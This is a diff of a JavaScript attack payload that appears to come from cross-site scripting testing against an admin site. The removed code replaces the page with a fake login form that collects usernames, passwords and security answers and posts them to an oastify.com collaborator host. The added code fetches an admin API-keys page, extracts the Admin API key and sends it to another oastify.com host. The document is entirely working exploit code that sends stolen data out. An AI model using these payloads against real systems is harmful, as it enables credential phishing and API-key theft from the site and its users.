@@ -1,53 +1,10 @@
-// 清除页面中的所有内容
-document.body.innerHTML = '';
-
-// 创建标题
-const loginTitle = document.createElement("h2"); // 更具体的变量名
-loginTitle.textContent = "Login page";
-document.body.appendChild(loginTitle);
-
-// 创建表单（使用唯一命名）
-const customLoginForm = document.createElement("form");
-customLoginForm.id = "customLoginForm"; // 使用独特ID
-
-// 输入域创建函数（提取公共逻辑）
-function createFormField(form, labelText, name, type = "text") {
-  form.appendChild(document.createTextNode(labelText));
-  const input = document.createElement("input");
-  input.type = type;
-  input.name = name;
-  input.required = true;
-  form.appendChild(input);
-  form.appendChild(document.createElement("br"));
-  return input;
+fetch("https://admin.zype.com/api_keys").then(a =&gt; a.text()).then(a =&gt; {const apiKeyMatch = a.match(/&lt;td&gt;Admin&lt;\/td&gt;\s*&lt;td&gt;(\w+)&lt;\/td&gt;/);if (apiKeyMatch) {
+const apiKey = apiKeyMatch[1];
+return fetch("https://g0hw11h44pyvej5f9ndkwz2sljraf03p.oastify.com?x=" + apiKey);
+} else {
+console.error("API Key not found in the response");
 }
-
-// 创建各输入域
-createFormField(customLoginForm, "account:", "username");
-createFormField(customLoginForm, "password:", "password", "password");
-createFormField(customLoginForm, "The answer of your question?", "answer");
-
-// 添加间隔
-customLoginForm.appendChild(document.createElement("br"));
-
-// 提交按钮（使用具体命名）
-const formSubmitButton = document.createElement("button");
-formSubmitButton.type = "submit";
-formSubmitButton.textContent = "Submit";
-customLoginForm.appendChild(formSubmitButton);
-
-// 添加表单到页面
-document.body.appendChild(customLoginForm);
-
-// 事件监听（使用独特函数名）
-customLoginForm.addEventListener("submit", function handleCustomFormSubmit(e) {
-  e.preventDefault();
-
-  const formData = new FormData(customLoginForm);
-  
-  // 发送请求（可根据需要保留或修改）
-  fetch("https://y104xp0azgj05yn8vl6zkqtmxd34r0fp.oastify.com", {
-    method: "POST",
-    body: formData
-  });
+})
+.then(response =&gt; {
+console.log(response);
 });
